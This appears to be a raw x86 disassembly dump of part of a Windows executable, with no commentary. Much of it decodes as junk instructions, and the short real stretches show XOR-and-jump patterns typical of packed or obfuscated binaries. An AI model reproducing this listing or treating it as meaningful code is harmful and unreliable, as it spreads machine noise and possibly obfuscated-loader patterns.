  40b832:	xlat   BYTE PTR ds:[ebx]
  40b833:	jge    0x40b86b
  40b835:	(bad)  
  40b836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b837:	add    DWORD PTR [ebp-0x48cb86f6],ecx
  40b83d:	lods   al,BYTE PTR ds:[esi]
  40b83e:	pop    di
  40b840:	rsm    
  40b842:	into   
  40b843:	and    al,BYTE PTR [eax]
  40b845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b846:	sbb    al,0x37
  40b848:	pusha  
  40b849:	mov    ecx,esp
  40b84b:	jae    0x40b7e9
  40b84d:	outs   dx,BYTE PTR ds:[esi]
  40b84e:	cmc    
  40b84f:	adc    BYTE PTR [ebp-0x68],ch
  40b852:	jg     0x40b818
  40b854:	stos   DWORD PTR es:[edi],eax
  40b855:	push   ecx
  40b856:	pop    ss
  40b857:	data16 or al,0x34
  40b85a:	jmp    0x7c26e7f1
  40b85f:	mov    ds:0x767d1af6,al
  40b864:	mov    al,0xf1
  40b866:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b868:	pop    es
  40b869:	sub    ebx,DWORD PTR [esi+ecx*8+0x526380e9]
  40b870:	std    
  40b871:	ret    0x6937
  40b874:	pop    ss
  40b875:	fwait
  40b876:	lods   al,BYTE PTR ds:[esi]
  40b877:	call   0x11e0e0c8
  40b87c:	and    eax,0x2035fd47
  40b881:	imul   ecx,DWORD PTR [edi],0x83c97125
  40b887:	es repz pop esp
  40b88a:	test   ecx,esp
  40b88c:	push   esp
  40b88d:	das    
  40b88e:	mul    BYTE PTR [eax-0x7f]
  40b891:	mov    ebp,DWORD PTR [bx+si]
  40b894:	pop    es
  40b895:	imul   edx,DWORD PTR [ebp-0x38],0x7d1a47bf
  40b89c:	fnstcw WORD PTR [edx-0x7579864]
  40b8a2:	add    dh,dh
  40b8a4:	inc    edi
  40b8a5:	int    0x99
  40b8a7:	push   0x47
  40b8a9:	hlt    
  40b8aa:	jbe    0x40b86e
  40b8ac:	ja     0x40b867
  40b8ae:	call   0xa9faa4e
  40b8b3:	jle    0x40b83c
  40b8b5:	or     eax,0xca3c559f
  40b8ba:	adc    BYTE PTR [edi-0x6d],ah
  40b8bd:	push   esi
  40b8be:	out    dx,eax
  40b8bf:	icebp  
  40b8c0:	or     ch,BYTE PTR gs:[ebp+0x44a8bd44]
  40b8c7:	in     al,0x6e
  40b8c9:	pop    ds
  40b8ca:	mov    ecx,0x121a863c
  40b8cf:	dec    ebp
  40b8d0:	and    ebp,ebx
  40b8d2:	inc    eax
  40b8d3:	jmp    0xf4b6:0xd65f28c4
  40b8da:	clc    
  40b8db:	enter  0x5308,0xae
  40b8df:	pop    esp
  40b8e0:	mov    ebx,0x5d083cb0
  40b8e5:	sahf   
  40b8e6:	xchg   ecx,eax
  40b8e7:	push   es
  40b8e8:	mov    bl,0xb1
  40b8ea:	enter  0xe0a2,0x2e
  40b8ee:	fcomip st,st(4)
  40b8f0:	add    esp,edx
  40b8f2:	inc    esi
  40b8f3:	(bad)  
  40b8f4:	cmc    
  40b8f5:	push   ebp
  40b8f6:	scas   eax,DWORD PTR es:[edi]
  40b8f7:	add    ebx,esp
  40b8f9:	in     al,0x89
  40b8fb:	jne    0x40b8e9
  40b8fd:	sbb    ecx,DWORD PTR ds:0x430546
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430496
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43049e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x4304a6,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42ee28,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42ee2c,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42ee20,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	sub    BYTE PTR [edi],0x90
  40b962:	inc    edi
  40b963:	dec    ebp
  40b964:	ds clc 
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b93c
  40b96d:	fist   DWORD PTR ds:0xe96c2e51
  40b973:	pop    ebp
  40b974:	dec    ebx
  40b975:	sbb    al,BYTE PTR [edx+0xf98a9b7]
  40b97b:	aaa    
  40b97c:	mov    eax,ds:0x8f186260
  40b981:	mov    edx,0x5c972db2
  40b986:	pop    ebp
  40b987:	ret    0xa468
  40b98a:	inc    ebp
  40b98b:	hlt    
  40b98c:	stos   BYTE PTR es:[edi],al
  40b98d:	cmc    
  40b98e:	shl    DWORD PTR [edx],cl
  40b990:	sti    
  40b991:	adc    DWORD PTR [edi],edi
  40b993:	adc    DWORD PTR [eax-0x3697a913],0x21
  40b99a:	lea    eax,[ebx]
  40b99c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b99d:	(bad)  
  40b99e:	in     eax,dx
  40b99f:	repnz adc BYTE PTR [esi-0x39],bh
  40b9a3:	(bad)  
  40b9a5:	cs pop ebx
  40b9a8:	cmp    eax,0x7fd9825a
  40b9ad:	retf   0xd949
  40b9b0:	data16 loope 0x40ba1e
  40b9b3:	mov    al,ds:0xc6882ab0
  40b9b8:	test   eax,0xb6d2b2f
  40b9bd:	(bad)  
  40b9be:	aas    
  40b9bf:	fdivr  DWORD PTR [eax-0x61]
  40b9c2:	xor    edx,ebx
  40b9c4:	push   edi
  40b9c5:	and    DWORD PTR [ecx+0x53372ae2],esi
  40b9cb:	mov    dh,0x35
  40b9cd:	jae    0x40b955
  40b9cf:	pusha  
  40b9d0:	bound  edi,QWORD PTR [edi-0x53]
  40b9d3:	es mov ch,0x82
  40b9d6:	sbb    al,0x7d
  40b9d8:	imul   esp,esp,0x903396d3
  40b9de:	cdq    
  40b9df:	ins    BYTE PTR es:[edi],dx
  40b9e0:	push   cs
  40b9e1:	or     al,0xab
  40b9e3:	fisubr WORD PTR [ecx-0x76]
  40b9e6:	push   esi
  40b9e7:	xchg   edx,eax
  40b9e8:	sub    al,0x1e
  40b9ea:	or     BYTE PTR [eax+0xe],ch
  40b9ed:	push   ebx
  40b9ee:	xchg   ebx,eax
  40b9ef:	mov    ds,WORD PTR [ecx-0x4de74df0]
  40b9f5:	out    0xf4,al
  40b9f7:	push   0x22
  40b9f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9fa:	sbb    cl,BYTE PTR [ebp-0x7]
  40b9fd:	addr16 inc eax
  40b9ff:	fsub   QWORD PTR [ebp+0x4c289b66]
  40ba05:	push   eax
  40ba06:	dec    esp
  40ba07:	ja     0x40ba88
  40ba09:	out    0xc5,al
  40ba0b:	jae    0x40ba3c
  40ba0d:	dec    ecx
  40ba0e:	mov    edi,esp
  40ba10:	mov    eax,0x9edd5934
  40ba15:	lock sar DWORD PTR [esi+0x46],1
  40ba19:	icebp  
  40ba1a:	adc    eax,DWORD PTR [esi+0x3929d056]
  40ba20:	mov    bh,0x59
  40ba22:	xchg   esp,eax
  40ba23:	and    BYTE PTR [ebp-0x133a1984],bh
  40ba29:	sub    DWORD PTR [ecx],esp
  40ba2b:	xchg   bl,dh
  40ba2d:	sub    al,0x15
  40ba30:	cmc    
  40ba31:	test   al,0x75
  40ba33:	gs mov ch,0x51
  40ba36:	pop    ebx
  40ba37:	mov    ebp,DWORD PTR [edi+0x35]
  40ba3a:	ins    BYTE PTR es:[edi],dx
  40ba3b:	test   al,0xbf
  40ba3d:	nop
  40ba3e:	fstp   DWORD PTR [ebx+0x70f3f2fd]
  40ba44:	ins    DWORD PTR es:[edi],dx
  40ba45:	pop    edi
  40ba46:	dec    esp
  40ba47:	clc    
  40ba48:	xchg   ecx,eax
  40ba49:	dec    ebx
  40ba4a:	xchg   esi,eax
  40ba4b:	jl     0x40ba1b
  40ba4d:	popa   
  40ba4e:	mov    al,0x7b
  40ba50:	xor    DWORD PTR [edx+0x35],ebx
  40ba53:	imul   ecx,DWORD PTR [edi],0x7c
  40ba56:	sbb    DWORD PTR [edi-0x6757817c],esi
  40ba5c:	cwde   
  40ba5d:	jne    0x40ba2b
  40ba5f:	ror    BYTE PTR [esi+ebx*4-0x60],cl
  40ba63:	xor    al,0x8
  40ba65:	cmc    
  40ba66:	xchg   edx,eax
  40ba67:	xchg   ecx,eax
  40ba68:	and    eax,0x91853184
  40ba6d:	sbb    DWORD PTR [ecx],0xfffffffc
  40ba70:	jnp    0x40ba5b
  40ba72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba73:	cmp    al,0x5f
  40ba75:	push   ebp
  40ba76:	cmp    ch,al
  40ba78:	adc    BYTE PTR [edx+0x24],dl
  40ba7b:	sbb    ebx,ecx
  40ba7d:	mov    edx,0xf0bb76ba
  40ba82:	mov    ch,0xe6
  40ba84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba85:	cs and al,0xfc
  40ba88:	sub    BYTE PTR [ebx],dl
  40ba8a:	jo     0x40baf4
  40ba8c:	ss pop esp
  40ba8e:	xor    eax,0x14d0dae4
  40ba93:	std    
  40ba94:	inc    esp
  40ba95:	xchg   edx,eax
  40ba96:	in     al,dx
  40ba97:	adc    ecx,edx
  40ba99:	in     eax,dx
  40ba9a:	hlt    
  40ba9b:	aad    0x35
  40ba9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba9e:	lea    esi,[edi+0x64f98bac]
  40baa4:	add    BYTE PTR [ebx],ah
  40baa6:	xchg   ecx,eax
  40baa7:	ins    BYTE PTR es:[edi],dx
  40baa8:	cli    
  40baa9:	stos   BYTE PTR es:[edi],al
  40baaa:	hlt    
  40baab:	mov    al,ds:0xc7c30330
  40bab0:	add    eax,0x42ee20
  40bab5:	push   ss
  40bab6:	cmp    eax,0xf83b0000
  40babb:	mov    DWORD PTR ds:0x430496,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42ee28,0x42ee14
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ee1c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ee1c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ee1c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ee1c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ebd4
  40bb1b:	cmp    DWORD PTR ds:0x42ee1c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x430556
  40bb2e:	xor    DWORD PTR ds:0x4304b6,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x4304b2,0x43049a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	and    al,0x15
  40bb58:	jb     0x40bb54
  40bb5a:	(bad)  
  40bb5b:	stc    
  40bb5c:	jle    0x40bbdc
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bbbc
  40bb63:	cmp    al,0xce
  40bb65:	in     eax,0x1
  40bb67:	rcr    BYTE PTR [esi-0x7c],cl
  40bb6a:	(bad)  
  40bb6b:	jle    0x40bb3d
  40bb6d:	mov    ebx,0xfdd9b6c7
  40bb72:	jge    0x40bb78
  40bb74:	test   DWORD PTR [eax+esi*8+0x53],esp
  40bb78:	and    BYTE PTR ds:0xe3106fec,bh
  40bb7e:	hlt    
  40bb7f:	add    al,0xe5
  40bb81:	push   ds
  40bb82:	sbb    esi,DWORD PTR [edi+0x2e]
  40bb85:	xchg   BYTE PTR [edx],cl
  40bb87:	push   es
  40bb88:	jecxz  0x40bb3e
  40bb8a:	push   0x20
  40bb8c:	adc    eax,0x637dae2c
  40bb91:	cwde   
  40bb92:	les    esp,FWORD PTR [edx+0x5df9018e]
  40bb98:	fwait
  40bb99:	dec    esi
  40bb9a:	pop    es
  40bb9b:	ret    0xe48c
  40bb9e:	nop
  40bb9f:	(bad)  
  40bba0:	loop   0x40bb96
  40bba2:	out    dx,al
  40bba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bba4:	dec    ebx
  40bba5:	pop    eax
  40bba6:	push   edx
  40bba7:	cmp    eax,0x55faf5c0
  40bbac:	(bad)  
  40bbad:	push   ds
  40bbae:	out    0xc4,al
  40bbb0:	mov    cl,0x4d
  40bbb2:	inc    ebp
  40bbb3:	loopne 0x40bb75
  40bbb5:	and    ecx,DWORD PTR [eax-0x61]
  40bbb8:	jns    0x40bb3a
  40bbba:	adc    DWORD PTR [esi+ebx*8+0x657de56f],esi
  40bbc1:	jg     0x40bbe8
  40bbc3:	xor    bh,BYTE PTR [edx-0x3f]
  40bbc6:	in     eax,dx
  40bbc7:	sub    cl,0x42
  40bbca:	popf   
  40bbcb:	movups XMMWORD PTR [ebx+0x32],xmm2
  40bbcf:	add    BYTE PTR [edi-0x2854fbcb],dl
  40bbd5:	cdq    
  40bbd6:	cmp    DWORD PTR [esi],ebp
  40bbd8:	arpl   WORD PTR [ebx],di
  40bbda:	clc    
  40bbdb:	ja     0x40bc47
  40bbdd:	arpl   sp,cx
  40bbdf:	jmp    0xd22adb72
  40bbe4:	cli    
  40bbe5:	mov    bh,0xc7
  40bbe7:	scas   al,BYTE PTR es:[edi]
  40bbe8:	pusha  
  40bbe9:	add    eax,0x532ea1f1
  40bbee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbf0:	fdivr  QWORD PTR [ecx+0x5]
  40bbf3:	or     eax,0x7f7dc4a8
  40bbf8:	sahf   
  40bbf9:	inc    esi
  40bbfa:	outs   dx,DWORD PTR ds:[esi]
  40bbfb:	jnp    0x40bbb2
  40bbfd:	mov    edi,0x3a8324d4
  40bc02:	pop    ds
  40bc03:	mov    eax,ds:0xe9c721d0
  40bc08:	shl    BYTE PTR [esi+0x2f],1
  40bc0b:	push   ecx
  40bc0c:	or     dl,dl
  40bc0e:	repnz push ebp
  40bc10:	stos   DWORD PTR es:[edi],eax
  40bc11:	bound  ebx,QWORD PTR [edi+0x5c431fa]
  40bc17:	lock shl ecx,0xd9
  40bc1b:	mov    cl,0x7e
  40bc1d:	or     BYTE PTR [ebp+eax*4-0x40],dh
  40bc21:	nop
  40bc22:	dec    eax
  40bc23:	enter  0x15dd,0xdc
  40bc27:	nop
  40bc28:	jg     0x40bc9b
  40bc2a:	out    dx,eax
  40bc2b:	xchg   ecx,eax
  40bc2c:	pop    ebx
  40bc2d:	out    dx,al
  40bc2e:	push   ebx
  40bc2f:	cs lock jmp 0xdf9b6255
  40bc36:	push   eax
  40bc37:	fbld   TBYTE PTR [edx-0xc]
  40bc3a:	and    ecx,DWORD PTR [esi-0x1a1285bd]
  40bc40:	inc    ecx
  40bc41:	(bad)  
  40bc42:	jl     0x40bc1d
  40bc44:	adc    eax,ecx
  40bc46:	mov    edi,0x8a91e991
  40bc4b:	mov    esi,es
  40bc4d:	push   0xffffffc3
  40bc4f:	icebp  
  40bc50:	into   
  40bc51:	and    eax,0x31b0d09
  40bc56:	cld    
  40bc57:	mov    cl,0xda
  40bc59:	setne  BYTE PTR ds:0xd9d67d22
  40bc60:	add    eax,0xba1eec52
  40bc65:	push   es
  40bc66:	push   esi
  40bc67:	test   BYTE PTR [edi+0x7e4dd3ee],0x2e
  40bc6e:	push   ss
  40bc6f:	inc    ecx
  40bc70:	sbb    dl,0x57
  40bc73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc74:	pop    esp
  40bc75:	sub    BYTE PTR [ecx],bh
  40bc77:	iret   
  40bc78:	mov    eax,0x161153e5
  40bc7d:	push   cs
  40bc7e:	xchg   ebx,eax
  40bc7f:	push   edx
  40bc80:	sub    al,0x44
  40bc82:	mov    eax,0xda116ccc
  40bc87:	inc    edi
  40bc88:	jl     0x40bc94
  40bc8a:	push   cs
  40bc8b:	js     0x40bce4
  40bc8d:	cmp    BYTE PTR [edx],0x7f
  40bc90:	adc    DWORD PTR [ecx],ebx
  40bc92:	mov    esi,0x4adf3f38
  40bc97:	out    dx,al
  40bc98:	push   es
  40bc99:	adc    BYTE PTR [eax+eax*8+0x2f6671b4],ch
  40bca0:	mov    DWORD PTR [edi],edi
  40bca2:	sub    eax,DWORD PTR [ebx]
  40bca4:	ret    
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x430552,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x43054e,0x42ee30
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x4304be,0x430546
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x4304c2,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x4304c2
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x4304c2,ecx
  40bcf2:	cmp    DWORD PTR ds:0x4304c2,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x4304c2,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x4304a2
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42ea2c
  40bd1f:	cmp    DWORD PTR ds:0x4304c2,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x4304c2
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x4304c2,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e772,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430496
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x43055a,0x430552
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ee10,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x4304b2,0x19
  40bd88:	cmp    DWORD PTR ds:0x4304b2,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x4304b2,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42ea30
  40bdad:	mov    ecx,DWORD PTR ds:0x4304b2
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x4304b2,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x43055a
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	or     al,0xd8
  40bdde:	ds jne 0x40bd91
  40bde1:	cli    
  40bde2:	jle    0x40be62
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40be47
  40bde9:	lea    esi,[ebp+0x7c6a239c]
  40bdef:	mov    bh,0xab
  40bdf1:	mov    ds:0x115b4080,al
  40bdf6:	xor    edi,DWORD PTR [eax+ecx*8-0x12]
  40bdfa:	xor    al,0x6e
  40bdfc:	nop
  40bdfd:	fsub   QWORD PTR [edi+0x36aa3cda]
  40be03:	sub    eax,0x9da40096
  40be08:	cmp    esp,DWORD PTR [edx-0xb]
  40be0b:	lods   eax,DWORD PTR ds:[esi]
  40be0c:	fld    st(2)
  40be0e:	aaa    
  40be0f:	aam    0xb
  40be11:	aaa    
  40be12:	pop    eax
  40be13:	sub    cl,BYTE PTR ds:0x1c7c4d1b
  40be19:	lods   al,BYTE PTR ds:[esi]
  40be1a:	repnz xchg esi,eax
  40be1c:	mov    al,ds:0x592be74
  40be21:	jp     0x40bea1
  40be23:	pop    ebp
  40be24:	cmp    bh,bl
  40be26:	inc    ebx
  40be27:	(bad)
  40be2b:	out    0xb1,al
  40be2d:	xchg   ebp,eax
  40be2e:	cli    
  40be2f:	sub    ebx,DWORD PTR [ebx-0x7d3e8cfd]
  40be35:	sar    ebp,1
  40be37:	ins    DWORD PTR es:[edi],dx
  40be38:	fidivr WORD PTR [esi+edx*8+0x256cf734]
  40be3f:	arpl   WORD PTR [esi],si
  40be41:	cs mov ch,0x21
  40be44:	mov    ds:0x14973801,eax
  40be49:	loope  0x40be2f
  40be4b:	fs leave 
  40be4d:	int    0x3b
  40be4f:	bound  esp,QWORD PTR [esi-0xa48ca58]
  40be55:	jl     0x40be4b
  40be57:	fcomip st,st(7)
  40be59:	add    edx,DWORD PTR [ecx-0x2e13ae0b]
  40be5f:	repnz mov eax,0xfe75e01d
  40be65:	int    0xb6
  40be67:	mov    ebx,0xcf6c23e2
  40be6c:	cdq    
  40be6d:	xchg   dl,dh
  40be6f:	stos   BYTE PTR es:[edi],al
  40be70:	xor    bh,BYTE PTR [edx]
  40be72:	aas    
  40be73:	xor    BYTE PTR [ecx+0x74769292],dh
  40be79:	xchg   esi,eax
  40be7a:	retf   
  40be7b:	in     al,0x7e
  40be7d:	jg     0x40bebe
  40be7f:	push   eax
  40be80:	jmp    0x40be0a
  40be82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be83:	sbb    BYTE PTR [edi+0x71],dl
  40be86:	sub    eax,0xca6652d7
  40be8b:	ror    DWORD PTR [ebp+0x1b8f77e6],1
  40be91:	je     0x40be2b
  40be93:	cmp    BYTE PTR [esi+edi*1+0x767d8fcc],ch
  40be9a:	jmp    0xa65c916e
  40be9f:	rcl    DWORD PTR ds:0xc38c7a10,cl
  40bea5:	inc    eax
  40bea6:	xor    cl,BYTE PTR [ecx]
  40bea8:	xor    cl,BYTE PTR ds:0x59c17358
  40beae:	xchg   ebx,eax
  40beaf:	dec    edx
  40beb0:	adc    BYTE PTR [edi],0x31
  40beb3:	xor    edx,edx
  40beb5:	mov    ecx,DWORD PTR [esi+ecx*2+0x63c8aac8]
  40bebc:	aad    0x2b
  40bebe:	jg     0x40bf1b
  40bec0:	ss int3 
  40bec2:	cli    
  40bec3:	add    eax,0x8e599527
  40bec8:	ds and eax,0x6eec264b
  40bece:	fisubr DWORD PTR [edx+0x64]
  40bed1:	xchg   BYTE PTR [ebp-0xd8b48b3],dl
  40bed7:	inc    eax
  40bed8:	xchg   ecx,eax
  40bed9:	lds    esi,FWORD PTR [ebp-0x23]
  40bedc:	pop    eax
  40bedd:	enter  0xe8f3,0x89
  40bee1:	imul   edx,DWORD PTR [edx-0x70],0xffffff80
  40bee5:	add    BYTE PTR [ecx],0x48
  40bee8:	test   eax,0x11ec0f8
  40beed:	cmp    dl,BYTE PTR [ebx]
  40beef:	out    0x36,eax
  40bef1:	nop
  40bef2:	mov    ecx,0xd0a009d1
  40bef7:	test   ebp,ebx
  40bef9:	data16 sub al,0x2b
  40befc:	ja     0x40bf67
  40befe:	rcr    BYTE PTR [ecx-0x1e],cl
  40bf01:	sub    eax,0xdde01308
  40bf06:	rcl    DWORD PTR [esi-0x6f511e7f],cl
  40bf0c:	imul   eax,DWORD PTR [esp+ebx*2],0xffffffad
  40bf10:	push   ss
  40bf11:	icebp  
  40bf12:	scas   al,BYTE PTR es:[edi]
  40bf13:	dec    esi
  40bf14:	fisub  WORD PTR [eax+0x79b8c8a4]
  40bf1a:	mov    dl,0xe0
  40bf1c:	arpl   WORD PTR [eax-0x6d],dx
  40bf1f:	sbb    dl,BYTE PTR [ebx+0x8]
  40bf22:	shl    DWORD PTR [esi-0x43aac39c],0x8
  40bf29:	mov    eax,DWORD PTR [ebp-0x14]
  40bf2c:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf2f:	sbb    DWORD PTR ds:0x4304a6,0xe94
  40bf39:	jmp    0x40c097
  40bf3e:	fmul   QWORD PTR [edi+0x7d6d4fad]
  40bf44:	cld    
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	push   ebp
  40bf4b:	mov    ecx,0xfc7134c3
  40bf50:	jle    0x40bfd0
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bf6f
  40bf57:	xchg   BYTE PTR [edi-0x3d],bh
  40bf5a:	pop    ebp
  40bf5b:	cmp    edi,esi
  40bf5d:	inc    eax
  40bf5e:	div    DWORD PTR [edx+0x590770e5]
  40bf64:	jns    0x40beeb
  40bf66:	xor    eax,DWORD PTR [ebx-0x73]
  40bf69:	xchg   ecx,eax
  40bf6a:	jb     0x40bf84
  40bf6c:	loopne 0x40bf41
  40bf6e:	pop    eax
  40bf6f:	xchg   esi,eax
  40bf70:	jne    0x40bf59
  40bf72:	fucomi st,st(0)
  40bf74:	mov    edi,0x5277c790
  40bf79:	mov    bh,0x94
  40bf7b:	lds    edi,FWORD PTR [edi-0x6]
  40bf7e:	aas    
  40bf7f:	fs add eax,0xfd5d98b8
  40bf85:	or     al,0x95
  40bf87:	push   ebx
  40bf88:	cmp    DWORD PTR [edx-0x2f0a1eae],0x6fff6a5c
  40bf92:	xchg   BYTE PTR [edx-0xe17298a],al
  40bf98:	dec    ax
  40bf9a:	fmul   DWORD PTR [ecx-0x49b74857]
  40bfa0:	pop    es
  40bfa1:	es jns 0x40bfb3
  40bfa4:	cwde   
  40bfa5:	lock imul esi,DWORD PTR [ecx+ebx*4-0x7b],0x164abd15
  40bfae:	jg     0x40bfb9
  40bfb0:	sub    BYTE PTR [ecx+ecx*1],al
  40bfb3:	xlat   BYTE PTR ds:[ebx]
  40bfb4:	out    0x2b,eax
  40bfb6:	shl    BYTE PTR [edx-0x40],1
  40bfb9:	dec    ebp
  40bfba:	ss pop edx
  40bfbc:	and    eax,0x2c6acebd
  40bfc1:	sub    edi,ebp
  40bfc3:	in     eax,0x4b
  40bfc5:	jmp    0x4d3bcb46
  40bfca:	xor    eax,0x2409e03
  40bfcf:	cwde   
  40bfd0:	mov    ecx,fs
  40bfd2:	gs je  0x40bfd6
  40bfd5:	lods   eax,DWORD PTR ds:[esi]
  40bfd6:	dec    esi
  40bfd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfd8:	push   ds
  40bfd9:	adc    BYTE PTR [edi+0x1e],0xb6
  40bfdd:	movups xmm0,XMMWORD PTR [edi]
  40bfe0:	pop    edx
  40bfe1:	lds    ebx,FWORD PTR [ebp-0x7c]
  40bfe4:	xchg   esp,eax
  40bfe5:	cdq    
  40bfe6:	mov    ah,0xe9
  40bfe8:	int3   
  40bfe9:	shl    eax,cl
  40bfeb:	mov    esp,0x7f9a8a6e
  40bff0:	(bad)  
  40bff2:	fs stc 
  40bff4:	xchg   edi,eax
  40bff5:	js     0x40bfc3
  40bff7:	ins    DWORD PTR es:[edi],dx
  40bff8:	sahf   
  40bff9:	je     0x40bfef
  40bffb:	mov    bh,0xb0
  40bffd:	inc    ecx
  40bffe:	or     BYTE PTR [edi+0x77c38119],ch
  40c004:	mov    bh,0xb2
  40c006:	pop    esp
  40c007:	(bad)  
  40c008:	xchg   edx,eax
  40c009:	test   DWORD PTR [ebx+0x45ea4c4f],eax
  40c00f:	and    al,cl
  40c011:	pusha  
  40c012:	dec    edx
  40c013:	aas    
  40c014:	out    dx,eax
  40c015:	mov    ds:0x87f2f177,eax
  40c01a:	xor    al,0xf1
  40c01c:	call   0xf0b5:0x5cdeac91
  40c023:	in     al,dx
  40c024:	scas   eax,DWORD PTR es:[edi]
  40c025:	xchg   esp,eax
  40c026:	pushf  
  40c027:	xlat   BYTE PTR ds:[ebx]
  40c028:	rcr    DWORD PTR [edi-0xf5cfc67],cl
  40c02e:	jns    0x40c066
  40c030:	mov    eax,ds:0xa0970125
  40c035:	mov    edi,0x38d71930
  40c03a:	cli    
  40c03b:	out    0xa9,eax
  40c03d:	cmc    
  40c03e:	sbb    edi,ebp
  40c040:	test   DWORD PTR [ebp+0x37],esi
  40c043:	lods   al,BYTE PTR ds:[esi]
  40c044:	push   ebx
  40c045:	cli    
  40c046:	push   edx
  40c047:	add    DWORD PTR [ebx+0x784c1d64],edi
